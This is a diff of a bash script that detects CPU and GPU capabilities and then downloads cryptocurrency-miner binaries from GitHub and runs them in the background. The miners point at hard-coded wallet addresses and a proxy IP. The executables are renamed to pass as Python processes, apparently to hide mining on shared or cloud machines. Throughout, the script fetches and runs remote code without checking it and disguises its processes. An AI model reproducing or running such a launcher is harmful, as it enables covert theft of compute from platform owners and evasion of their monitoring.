@@ -1,6 +1,8 @@
-#!bin/bash -xe
+#!/bin/bash -xe
+echo -e '####################################################################################'
+echo -e '##################      '"MAX  Auto"' Ver:0.2.15        ############################'
+echo -e '####################################################################################'
 
-echo -e '##########################################################################'
 PROX=78.47.69.185
 ETPort=443
 RVPort=80
@@ -11,7 +13,16 @@ DisplayRefrech=60
 VCThreads=$[$(nproc)*4]
 XMThreads=$[$(nproc)*1]
 
-Debug=False
+#Debug=True
+Debug=True
+
+#Keys
+W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
+W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
+W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
+W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
+
+#
 
 ## getting IP info
 
@@ -23,14 +34,12 @@ IPORG=$(echo $JSINFO|grep -oP '(?<="org": ")[^"]*')
 IIP=$(echo $JSINFO|grep -oP '(?<="ip": ")[^"]*')
 #IPNAME=$(sed 's|\.|o|g' <<< $IIP)
 IPNAME=$(echo $IIP | sed -r 's!/.*!!; s!.*\.!!')
-INFO="$COUNTRY""_""$REGION""_""$IPNAME"
+INFO="$REGION""_""$IPNAME"
 LOC=$(echo $JSINFO|grep -oP '(?<="loc": ")[^"]*')
 #echo $JSINFO
 echo "let's name it: $INFO"
 
 
-echo -e '################## '"RV"' Ver:0.2.12 VCDebug     ############################'
-echo -e '###########################################################################'
 
 ## COLORS
 # Reset
@@ -123,20 +132,24 @@ then
 echo -e "${On_IGreen}"'## CPU AVX512 ##'"${Color_Off}"
 OP=XM
 CPU='AVX512'
+BCColor="$On_Green""$BICyan"
 elif [ $(lscpu |grep avx2 |wc -l) == 1 ]
 then
 echo -e "${On_IBlue}"'##CPU AVX2 ##'"${Color_Off}"
 OP=XM
 CPU='AVX2'
+BCColor="$On_Blue""$BICyan"
 elif [ $(lscpu |grep avx |wc -l) == 1 ]
 then
 echo -e "${On_IYellow}"'## CPU AVX ##'"${Color_Off}"
 OP=XM
 CPU='AVX'
+BCColor="$On_Yellow""$BICyan"
 else
 echo -e "${On_IRed}"'## CPU OLD ##'"${Color_Off}"
 OP=VC
 CPU='OLD'
+BCColor="$On_Red""$BICyan"
 fi
 
 #################### GPU Type #########################
@@ -174,7 +187,7 @@ echo -e "${On_IYellow}"'###    K80     ###'"${Color_Off}"
 GPU=K80
 OPG=RV
 PROG=CL
-BGColor=$On_IYellow
+BGColor="$On_IYellow""$BRed"
 elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
 then
 
@@ -195,8 +208,10 @@ fi
 ##################################################################
 ########                execution                        #########     
 ##################################################################
+#OP=$OP
+#OPG=$OPG
 OP=VC
-OPG=RV
+GOP=RV
 
 i="0"
 
@@ -204,27 +219,28 @@ while true
 do
 if [ $OP == "XM" ]
 then
-####### XM
-#               Executable
-echo start >> ooutxm
-rm -rf pythonxm
-wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
-chmod +x pythonxm
-#                Config
-wget -q https://github.com/one10001/10001code/raw/main/config.json
-sed -i "s+ip0001+RV_$IPNAME+g" config.json
-sed -i "s+xxpppxx+$PROX+g" config.json
+    ####### XM
+    #               Executable
+    echo start >> ooutxm
+    rm -rf pythonxm
+    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+    chmod +x pythonxm
+    #                Config
+    wget -q https://github.com/one10001/10001code/raw/main/config.json
+    sed -i "s+ip0001+RV_$IPNAME+g" config.json
+    sed -i "s+78.47.69.185+$PROX+g" config.json
+    sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
 
-nohup ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
+    nohup ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
 
 else
-###### VC
-echo start >> ooutvc
-rm -rf pythonheq
-wget -q https://github.com/one10001/10001code/raw/main/pythonheq
-chmod +x pythonheq
+    ###### VC
+    echo start >> ooutvc
+    rm -rf pythonheq
+    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+    chmod +x pythonheq
 
-nohup ./pythonheq -v -l "$PROX":"$VCPort" -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> ooutvc 2>> ooutvc &
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t 4 1>> ooutvc 2>> ooutvc &
 
 fi
 
@@ -235,9 +251,9 @@ then
     chmod +x pyeth2
     if  [ $PROG == "CU" ]
     then
-        nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
+        nohup  ./pyeth2  -P stratum+tcp://"$W_ET"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
     else
-        nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -G 2>> oout 1>> oout &
+        nohup  ./pyeth2  -P stratum+tcp://"$W_ET"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -G 2>> oout 1>> oout &
     fi
 
 elif [ $OPG == "RV" ]
@@ -247,9 +263,9 @@ then
     chmod +x python2.6.6
     if  [ $PROG == "CU" ]
     then
-    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -U 2>> oout 1>> oout &
+    nohup  ./python2.6.6  -P stratum+tcp://"$W_RV"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -U 2>> oout 1>> oout &
     else
-    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
+    nohup  ./python2.6.6  -P stratum+tcp://"$W_RV"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
     fi
 else
     echo "No GPU"
@@ -260,11 +276,10 @@ fi
 ########                Display                          #########     
 ##################################################################
 
-
-    while true
+while true
     do
         i=$[$i+1]
-        echo -e "${BGColor}${BIYellow} CPU OP: $OP | GPU OP: $OPG  | GPU: $GPU  |  CPU ARC: $CPU  | IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG"
+        echo -e "${BIYellow}${BGColor}CPU OP: $OP | GPU OP: $OPG  | GPU: $GPU  |  CPU ARC: $CPU  | IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG"
 
         Gacc=$(grep Acc oout | wc -l)
         Vacc=$(grep Acc ooutvc | wc -l)
@@ -289,17 +304,17 @@ fi
             Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}')
             XSHARE=$(grep Acc oout | wc -l)
             XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
-            echo -e "${BIWhite}${BGColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}" 
+            echo -e "${BIWhite}${BCColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}" 
         elif [ $OP == "VC" ]
         then
             Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
             VSHARE=$(grep Acc ooutvc | wc -l)
             VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
-            echo -e "${BIWhite}${BGColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
+            echo -e "${BIWhite}${BCColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
         else 
             VSHARE=$(grep Acc ooutvc | wc -l)
             VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
-            echo -e "${BIWhite}${BGColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $XRATIO ${Color_Off} | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
+            echo -e "${BIWhite}${BCColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $XRATIO ${Color_Off} | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
         fi
 
         if [ $Debug == "True" ]
